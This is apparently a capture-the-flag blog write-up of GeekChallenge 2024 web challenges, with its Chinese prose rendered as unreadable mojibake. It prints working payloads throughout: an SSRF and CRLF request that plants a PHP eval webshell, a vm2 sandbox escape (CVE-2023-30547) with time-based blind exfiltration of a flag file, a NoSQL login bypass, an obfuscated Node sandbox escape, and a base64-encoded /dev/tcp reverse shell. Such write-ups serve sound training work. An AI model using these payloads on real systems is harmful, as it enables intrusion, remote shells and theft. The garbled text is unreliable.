src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-171029805.png" class=""><br>å‡ ä¸ªåŸºç¡€çš„ä¼ å‚ï¼Œä¼ªé€ ipå¤´æˆ‘ç›´æ¥ç”¨æ’ä»¶ä¼ äº†ä¸€å †è¿›å»<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241118-131010586.png" class="">  </p><p>å¾—åˆ°tokenåå’Œkeyåï¼Œè¿›è¡Œjwtä¼ªé€ <br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-171504544.png" class=""><br>hasFlagæ”¹ä¸ºtrueå¾—åˆ°flag<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-171517504.png" class="">  </p><h2 id="Can-you-Pass-Me"><a href="#Can-you-Pass-Me" class="headerlink" title="Can_you_Pass_Me"></a>Can_you_Pass_Me</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-173331997.png" class="">  <p>å¯ä»¥å‘ç°sstiï¼Œç›´æ¥ä¸Šæˆ‘å¿ƒçˆ±çš„å°fenjing<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-173500689.jpg" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-173928749.png" class=""><br>åœ¨è¯»flagæ—¶å›æ˜¾å¦‚ä¸‹ã€‚<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-173413716.jpg" class=""><br>ç›´æ¥å¼¹shellï¼ˆä¹Ÿå¯ä»¥æ‰“å†…å­˜é©¬ï¼‰<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-174124378.png" class="">  </p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-174142169.png" class="">  <h2 id="ez-SSRF"><a href="#ez-SSRF" class="headerlink" title="ez_SSRF"></a>ez_SSRF</h2><p>www.zipæœ‰æºç <br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-175301355.png" class=""><br>æ‰“å¼€ä¼šå‘ç°å…¶è°ƒç”¨äº†ä¸€ä¸ªå«ScapClientç±»çš„calculatoræ–¹æ³•ã€‚ç®€å•æŸ¥äº†ä¸€ä¸‹å‘ç°ï¼ŒScapClientå°±æ˜¯ä¸€ä¸ªç”¨äºåˆ›å»ºsoapå®¢æˆ·ç«¯çš„ç±»ï¼Œè€Œå…¶ä¸­å¹¶æ²¡æœ‰calculatoræ–¹æ³•å³ä¼šè§¦å‘callï¼Œä¹Ÿå°±soapå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·äº†è¯·æ±‚ã€‚<br>ç®€å•å°è¯•ä¸€ä¸‹</p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-180728510.png" class="">  <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-180824413.png" class="">  <p>æˆåŠŸssrfï¼Œæˆ‘ä»¬åœ¨çœ‹ä¸€ä¸‹å¦ä¸€ä¸ªphpæ–‡ä»¶<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-180926629.png" class=""><br>å¯ä»¥å‘ç°å…¶è¦æ±‚ä¸ºæœ¬åœ°è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨ssrfæ¥æ‰“ä»–ã€‚<br>è€Œè¦æ‰“ä»–æˆ‘ä»¬å¯ä»¥å‘ç°<br>æˆ‘ä»¬éœ€è¦è¿›è¡ŒPOSTä¼ å€¼æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-181054435.png" class=""><br>è¿˜éœ€è¦æ„é€ AUTHORIZATIONæ ‡å¤´ï¼Œå†…å®¹ä¸ºBasic ï¼šåŠ ä¸Šaaaaaaaaaaaadmin:i_want_to_getI00_inMyT3stçš„base64ç¼–ç <br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-181150651.png" class=""><br>ä¹Ÿå°±æ˜¯è¦æ„é€ åƒä¸‹é¢é‚£æ ·çš„è¯·æ±‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 268</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: 123&#x27;s Chrome</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">SOAPAction: &quot;hahaha#calculator&quot;</span><br><span class="line">Authorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0</span><br><span class="line"></span><br><span class="line">expression=system(&quot;echo+&#x27;&lt;?php+eval(\$_POST[123]);?&gt;&#x27;+&gt;/var/www/html/LSE.php&quot;);</span><br></pre></td></tr></table></figure><br>ä¹‹å‰æ‰“dasçš„æ—¶å€™æœ‰é‡åˆ°è¿‡éœ€è¦ä½¿ç”¨CRLFçš„æƒ…å†µ<a href="https://www.cnblogs.com/piaomiaohongchen/p/15892211.html">https://www.cnblogs.com/piaomiaohongchen/p/15892211.html</a><br>ç»è¿‡å°è¯•å‘ç°å…¶å­˜åœ¨CRLFå³å…¶è§£æäº†æˆ‘ä»¬çš„%0D%0Aã€‚<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-190216221.png" class="">  </p><p>åˆå› ä¸ºUAå¤´çš„ä½ç½®åœ¨Content-Length: å’ŒAuthorization:ä¹‹ä¸Šæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ªé€ POSTè¯·æ±‚ï¼ˆå¦‚æœåœ¨Content-Lengthèƒ½ä¸èƒ½æˆåŠŸæˆ‘æ²¡å°è¯•è¿‡ï¼‰å’ŒAuthorization:çš„å†…å®¹ã€‚<br>å³æˆ‘ä»¬å¯ä»¥ä¼ªé€ å‡ºä¸Šé¢çš„payloadäº†<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AAuthorization%3A+Basic+YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0D%0AContent-Length%3A+79%0D%0A%0D%0Aexpression=system(&quot;echo+&#x27;&lt;?php+eval(\$_POST[123]);?&gt;&#x27;+&gt;/var/www/html/LSE.php&quot;);</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-190049154.png" class="">  </p><p>å› ä¸ºæˆ‘ä»¬çš„Content-Lengthä¸º79å³POSTä¼ å‚79åçš„å†…å®¹éƒ½ä¸ä¼šè¢«è§£æï¼Œå³è¯¥è¯·æ±‚å‘åˆ°åç«¯è¢«è§£æçš„çœŸå®è¡¨å•åº”è¯¥ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:7777</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: aaaa</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Authorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0</span><br><span class="line">Content-Length: 79</span><br><span class="line"></span><br><span class="line">expression=system(&quot;echo &#x27;&lt;?php eval(\$_POST[123]);?&gt;&#x27; &gt;/var/www/html/LSE.php&quot;);</span><br></pre></td></tr></table></figure><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-190408565.png" class="">  <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-190521841.png" class="">  <p>ä¸€å¼€å§‹åœ¨æ‰“è¿™é“é¢˜çš„æ—¶å€™ï¼Œ/flagå†…æ˜¯æ²¡æœ‰çœŸçš„flagçš„ï¼Œè€Œæ ¹ç›®å½•ä¸‹æœ‰ä¸ªshæ–‡ä»¶å†™ç€å°†flagå†™å…¥åˆ°äº†mysqlé‡Œï¼Œå¯æ˜¯åœ¨æ‰“çš„æ—¶å€™å‘ç°mysqlæ²¡æœ‰å¼€å¯ï¼Œè€Œå¼€å¯mysqlè¦rootæƒé™ï¼Œå°±è¿™æ ·æˆ‘æ€¼ç€ææƒæ€¼äº†ä¿©ä¸ªå¤šå°æ—¶å‡ºä¸æ¥ï¼Œäºæ˜¯é—®äº†å‡ºé¢˜äºº:(ï¼ˆç¯å¢ƒå‡ºé—®é¢˜äº†ï¼‰) </p><h2 id="escapeSandbox-PLUS"><a href="#escapeSandbox-PLUS" class="headerlink" title="escapeSandbox_PLUS"></a>escapeSandbox_PLUS</h2><p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Å¿YCLOVER</span><br></pre></td></tr></table></figure><br>å‚è€ƒpç‰›çš„jså¤§å°å†™ç‰¹æ€§çš„æ–‡ç« å¯ä»¥çŸ¥é“Å¿YCLOVERä¼šæ¯å¤§å†™è½¬ä¸ºSYCLOVERè€Œå°å†™ä¸ä¼šè½¬ä¸ºsyclover<br><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-091937682.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-091955569.png" class=""><br>ç„¶åå¯ä»¥å‘ç°å…¶ä¸ºvm2æ²™ç®±ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¯•ç”¨CVE-2023-30547æ¥æ‰“è¿™ä¸ªé€ƒé€¸payloadå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">async function fn() &#123;</span><br><span class="line">    (function stack() &#123;</span><br><span class="line">        new Error().stack;</span><br><span class="line">        stack();</span><br><span class="line">    &#125;)();</span><br><span class="line">&#125;</span><br><span class="line">p = fn();</span><br><span class="line">p.constructor = &#123;</span><br><span class="line">    [Symbol.species]: class FakePromise &#123;</span><br><span class="line">        constructor(executor) &#123;</span><br><span class="line">            executor(</span><br><span class="line">                (x) =&gt; x,</span><br><span class="line">                (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;sleep 3&#x27;); &#125;</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">p.then();</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯ç»è¿‡å®æµ‹å…¶æ²¡æœ‰å›æ˜¾ï¼Œä¸”å¥½åƒä¸å‡ºç½‘ï¼Œcurlå’Œpingéƒ½ä¸é€šã€‚äºæ˜¯æˆ‘å°±æƒ³åˆ°ä½¿ç”¨ç›²é“ï¼Œæ‰“æ—¶é—´å»¶è¿Ÿ<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-131820775.png" class=""><br>å¯ä»¥å…ˆæµ‹å‡ºflagé•¿åº¦å†ç»§ç»­ç›²æ³¨<br>payloadå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code[]=async%20function%20fn()%20%7B%0A%20%20%20%20(function%20stack()%20%7B%0A%20%20%20%20%20%20%20%20new%20Error().stack%3B%0A%20%20%20%20%20%20%20%20stack()%3B%0A%20%20%20%20%7D)()%3B%0A%7D%0Ap%20%3D%20fn()%3B%0Ap.constructor%20%3D%20%7B%0A%20%20%20%20%5BSymbol.species%5D%3A%20class%20FakePromise%20%7B%0A%20%20%20%20%20%20%20%20constructor(executor)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20executor(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(x)%20%3D%3E%20x%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(err)%20%3D%3E%20%7B%20return%20err.constructor.constructor(&#x27;return%20process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(sleep+$(cat+/flag+|+cut+-cÂ§2Â§+|+tr+Â§YÂ§+3))&#x27;)%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20)%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%7D%3B%0Ap.then()%3B</span><br></pre></td></tr></table></figure><br>æˆ‘å°†çº¿ç¨‹è°ƒåˆ°1é—´éš”1ç§’ä¹Ÿä¼šå‡ºç°ç½‘ç»œæ³¢åŠ¨ï¼Œå¤šè¯•å‡ æ¬¡å°±å¥½äº†<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-131625334.png" class=""><br>SYC{vM2_LAstDancE}<br>å‚è€ƒæ–‡ç« :<a href="https://cloud.tencent.com/developer/article/1345692">åŸºäºæ—¶å»¶çš„ç›²é“ç ”ç©¶ï¼šå—é™ç¯å¢ƒä¸‹çš„å†…å®¹å›ä¼ ä¿¡é“</a></p><h2 id="noSandbox"><a href="#noSandbox" class="headerlink" title="noSandbox"></a>noSandbox</h2><p>ä¸€å¼€å§‹é¢˜ç›®æœ‰ç»™æç¤ºæ˜¯èŠ’æœdbã€‚è¿›å…¥åéœ€è¦ç™»é™†ï¼Œé‚£ä¹ˆçŒœæµ‹å…¶ä¸ºnosqlæ³¨å…¥,å‘ç°å…¶è§£æjson,æ„é€ æ°¸çœŸå¼<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ne&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ne&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>ç„¶åå°±æ˜¯ç»•æ²™ç®±äº†ã€‚</p><p>çœ‹åˆ°è¿™ä¸ªæ²™ç®±è¯´å®è¯å¾ˆç†Ÿæ‚‰ï¼Œä¹‹å‰æ‰“NKCTFæ—¶å°±é‡åˆ°è¿‡ç±»ä¼¼çš„ï¼Œä½†æ˜¯è¿™é¢˜çš„wafæ›´æ­»ï¼ŒNKCTFçš„wpé‡Œæœ‰ä¸€ç§ç»•å‘å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">&#x27;exeicSync&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é¢˜è¿‡æ»¤äº†replaceã€‚æˆ‘ä»¬éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚æˆ‘ä»¬å¯ä»¥å°†å‰ä¿©ä¸ªçš„replaceæ”¹æˆå¤§å†™è½¬å°å†™ç»•è¿‡ã€‚è€Œåé¢ä¸€ä¸ªexecSyncåˆ™ä¸èƒ½ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•ç»•è¿‡ã€‚è¿™é‡Œæˆ‘æ˜¯ä½¿ç”¨sliceæ¥æ‹†å‡ºå­—ç¬¦è½¬ä¸ºå°å†™ï¼Œç„¶åå†ç”¨æ¨¡æ¿å­—ç¬¦çš„æ–¹æ³•æ¥æ‹¼æ¥ä¸Šå¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">`return proCess`</span>.toLowerCase()</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">`child_proCess`</span>.<span class="title function_">toLowerCase</span>());</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">`<span class="subst">$&#123;<span class="string">`exeCSync`</span>.slice(<span class="number">0</span>, <span class="number">3</span>)&#125;</span><span class="subst">$&#123;<span class="string">`exeCSync`</span>.charAt(<span class="number">3</span>).toLowerCase()&#125;</span><span class="subst">$&#123;<span class="string">`exeCSync`</span>.slice(<span class="number">4</span>)&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">`whoami`</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>ç„¶ååå¼¹shell<br>echo c2ggLWkgPiYgL2Rldi90Y3AvaXAvNzc3NyAwPiYx|base64 â€”decode|bash</p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241112-084330822.png" class="">  <h2 id="100-çš„âšª"><a href="#100-çš„âšª" class="headerlink" title="100%çš„âšª"></a>100%çš„âšª</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-205047967.png" class="">  <p>base64è§£ç SYC{5UcH_@_Wo0d3rfUl_CiRc1e}</p><h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Can you RCE me?</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/start.*now/is&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>], <span class="string">&quot;start now&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Well, you haven&#x27;t started.&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to GeekChallenge2024!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You took the first step!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It is not enough to stop you!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It is so easy, do you know sha1 and md5?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-213500138.png" class="">  <p>è¿™ä¸ªåˆ¤æ–­ç›´æ¥ä¼ æ•°ç»„<br><code>__2024.geekchallenge.ctf</code>éæ³•å˜é‡åç›´æ¥ä½¿ç”¨<code>_[2024.geekchallenge.ctf</code>æ¥ä¼ å€¼ã€‚<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-213644190.png" class=""><br>å¯ä»¥å‘ç°é¢˜ç›®çš„md5å€¼ä¸º0eå¼€å¤´çš„<br>ç„¶åsha1å¼€å¤´ä¸º0eçš„ç»•è¿‡md5å€¼aaroZmOk<br>åé¢çš„å˜é‡æˆ‘ä»¬ç›´æ¥GETä¼ å€¼ç„¶åå˜é‡è¦†ç›–å³å¯<br>intvalæˆ‘ä»¬ç›´æ¥ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡<br>æœ€åä¸€ä¸ªæ­£åˆ™æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ç¬¬ä¸€ä¸ªç”¨çš„æ˜¯+å·ï¼Œè¿™ä»£è¡¨è¿™rceå‰è‡³å°‘æœ‰ä¸€ä¸ªï¼Œé‚£ä¹ˆç›´æ¥ä¼ å…¥rceå³å¯ã€‚(åŸæœ¬æƒ³è¯•ç€ç”¨æ­£åˆ™å›æº¯çš„ï¼Œä½†æ˜¯å¥½åƒGETä¸èƒ½ä¼ é‚£ä¹ˆå¤šå­—ç¬¦)<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-212917283.png" class="">  </p><h2 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a>SecretInDrivingSchool</h2><img 